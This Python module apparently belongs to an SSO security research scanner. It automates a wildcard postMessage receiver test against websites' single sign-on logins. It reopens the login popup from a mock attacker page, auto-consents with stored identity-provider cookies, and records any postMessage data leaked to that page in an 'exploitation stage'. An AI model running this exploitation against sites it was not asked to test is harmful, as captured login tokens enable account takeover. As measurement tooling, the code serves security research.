import logging
import json
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError, Error
from modules.browser.browser import PlaywrightBrowser, PlaywrightHelper
from modules.helper.tmp import TmpHelper
from modules.helper.auto_consent import AutoConsentHelper
from modules.helper.sso_interceptor import SSOInterceptorHelper


logger = logging.getLogger(__name__)


class WildcardReceiverAnalyzer:


    def __init__(self, domain: str, config: dict):
        self.domain = domain
        self.config = config

        self.browser_config = config["browser_config"]
        self.idp_name = config["idp_name"]
        self.idp_integration = config["idp_integration"]
        self.login_page_url = config["login_page_url"]
        self.element_coordinates_x = config["element_coordinates_x"]
        self.element_coordinates_y = config["element_coordinates_y"]
        self.element_width = config["element_width"]
        self.element_height = config["element_height"]
        self.idp_username = config["idp_username"]
        self.idp_password = config["idp_password"]
        self.idp_cookie_store = config["idp_cookie_store"]

        self.result = {}


    def start(self) -> dict:
        logger.info(f"Starting wildcard receiver analysis for idp {self.idp_name} on: {self.login_page_url}")

        with TmpHelper.tmp_dir() as pdir, sync_playwright() as pw:
            context, page = PlaywrightBrowser.instance(pw, self.browser_config, pdir)

            try:
                # start sso interceptor
                sso_interceptor = SSOInterceptorHelper(context, self.idp_name, self.idp_integration)
                sso_interceptor.start_intercept()

                # navigate to login page
                logger.info(f"Navigate to login page: {self.login_page_url}")
                PlaywrightHelper.navigate(page, self.login_page_url, self.browser_config)
                PlaywrightHelper.sleep(page, 5)

                # start interception of all requests
                requests = []
                def on_request(request):
                    requests.append(request)
                context.on("request", on_request)

                # determine popup url that is the first url opened in popup
                popup_url = None
                try:
                    # click on coordinate and wait for popup
                    x = self.element_coordinates_x + self.element_width/2
                    y = self.element_coordinates_y + self.element_height/2
                    with page.expect_popup(timeout=2_000) as page_info:
                        logger.info(f"Clicking on coordinate ({x}, {y}) and waiting for popup")
                        page.mouse.click(x, y)
                    logger.info("Popup opened after clicking coordinate, waiting for popup to load")
                    # wait for popup to load
                    PlaywrightHelper.sleep(page_info.value, 5)
                    # stop interception of all requests
                    context.remove_listener("request", on_request)
                    # determine popup url
                    for r in requests:
                        if r.frame == page_info.value.main_frame:
                            logger.info(f"Popup url: {r.url}")
                            popup_url = r.url
                            break
                except TimeoutError:
                    logger.info("No popup opened after clicking coordinate")
                    # stop interception of all requests
                    context.remove_listener("request", on_request)
                except Error:
                    logger.info("Popup immediately closed after opening")
                    # stop interception of all requests
                    context.remove_listener("request", on_request)

                # stop sso interceptor
                sso_interceptor.stop_intercept()

                # close all popups
                PlaywrightHelper.close_all_other_pages(page)

                # store result for exploration stage
                self.result["exploration_stage"] = {
                    **sso_interceptor.get_idp_interceptions(),
                    "popup_url": popup_url
                }

                # if popup url and login request is valid
                if popup_url and sso_interceptor.idp_login_request:

                    # start auto consent
                    auto_consent = AutoConsentHelper(
                        context, page,
                        self.idp_name, self.idp_integration,
                        self.idp_username, self.idp_password, self.idp_cookie_store
                    )

                    # load idp cookies to skip reauthentication on the idp
                    auto_consent.load_idp_cookies()

                    # navigate to attacker page
                    attacker_url = "https://mock.sso-monitor.me"
                    logger.info(f"Navigate to attacker page: {attacker_url}")
                    PlaywrightHelper.navigate(page, attacker_url, self.browser_config)

                    # start sso interceptor
                    sso_interceptor = SSOInterceptorHelper(context, self.idp_name, self.idp_integration)
                    sso_interceptor.start_intercept()

                    # callback for postmessage interception
                    logger.info("Register callback for postmessage interception")
                    postmessages = []
                    def on_postmessage(pm):
                        pm_parsed = json.loads(pm)
                        # try to parse data as string containing json
                        if type(pm_parsed["data"]) is str:
                            try: pm_parsed["data"] = json.loads(pm_parsed["data"])
                            except json.decoder.JSONDecodeError: pass
                        # store parsed postmessage
                        postmessages.append({
                            "timestamp": datetime.strptime(pm_parsed["date"], "%Y-%m-%dT%H:%M:%S.%fZ").timestamp(),
                            "initiator_origin": pm_parsed["origin"],
                            "receiver_url": pm_parsed["documentLocation"]["href"],
                            "receiver_origin": pm_parsed["documentLocation"]["origin"],
                            "receiver_title": pm_parsed["documentTitle"],
                            "data": pm_parsed["data"]
                        })
                    page.expose_function("_ssomon_postmessage_callback", on_postmessage)

                    # intercept all postmessages
                    logger.info("Register event listener for postmessage interception")
                    page.evaluate("""
                        window.addEventListener('message', (e) => {
                            if (window._ssomon_postmessage_callback) {
                                window._ssomon_postmessage_callback(JSON.stringify({
                                    date: new Date(),
                                    origin: e.origin,
                                    documentLocation: document.location,
                                    documentTitle: document.title,
                                    data: e.data
                                }))
                            }
                        })
                    """)

                    # open popup url in new popup
                    logger.info(f"Open popup url in new popup on attacker page: {popup_url}")
                    page.evaluate(f"window._popup = window.open('{popup_url}')")

                    # send ping to popup every second
                    page.evaluate("setInterval( () => { window._popup.postMessage('ping', '*') }, 1000)")

                    # run auto consent in popup
                    PlaywrightHelper.sleep(page, 30)

                    # stop sso interceptor
                    sso_interceptor.stop_intercept()

                    # store idp cookies to skip reauthentication on the idp
                    auto_consent.store_idp_cookies()

                    # store result for exploitation stage
                    self.result["exploitation_stage"] = {
                        **sso_interceptor.get_idp_interceptions(),
                        "auto_consent_log": auto_consent.log,
                        "postmessage_leaks": postmessages
                    }

                # close context
                PlaywrightHelper.close_context(context)

            except TimeoutError as e:
                logger.warning(f"Timeout during wildcard receiver analysis for idp {self.idp_name} on: {self.login_page_url}")
                logger.debug(e)
                self.result = {"error": "Timeout"}

            except Error as e:
                logger.warning(f"Error during wildcard receiver analysis for idp {self.idp_name} on: {self.login_page_url}")
                logger.debug(e)
                self.result = {"error": f"{e}"}

        return self.result
